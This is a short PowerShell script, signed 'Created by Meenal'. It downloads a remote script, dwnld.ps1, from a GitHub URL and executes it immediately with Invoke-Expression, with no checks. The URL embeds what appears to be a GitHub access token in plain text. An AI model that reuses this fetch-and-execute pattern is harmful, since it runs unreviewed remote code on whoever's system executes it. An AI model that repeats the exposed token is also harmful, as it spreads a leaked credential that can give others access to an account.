# Created by Meenal

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Script = Invoke-RestMethod https://github.com/Meenaljyotika/demo-4/blob/main/dwnld.ps1?access_token=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

Invoke-Expression $Script